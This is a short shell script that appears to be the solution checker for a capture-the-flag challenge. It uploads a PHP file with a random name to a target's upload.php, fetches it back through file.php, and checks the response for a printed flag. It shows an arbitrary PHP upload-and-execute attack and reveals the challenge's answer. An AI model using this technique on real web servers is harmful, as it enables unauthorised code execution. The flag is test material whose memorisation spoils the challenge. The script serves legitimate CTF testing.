#!/bin/sh

# Meant to run with : ./writeup.sh --connection-info "http://localhost:8000"

RAND=$(dd if=/dev/urandom count=16 bs=1 2> /dev/null| md5sum | cut -d ' ' -f1)

curl \
  --silent \
  -F "filename=$RAND.php" \
  -F "fileUploaded=@up.php" \
  "$2/upload.php"

if curl --silent "$2/file.php?file=$RAND.php" | grep 'TUDCTF{D1DN7_m0M_73lL_Y0U_b3_c4r3Ful_W17H_PHP}' > /dev/null; then
  echo "SUCCESS"
  exit 0
else
  echo "FAIL"
  exit 1
fi
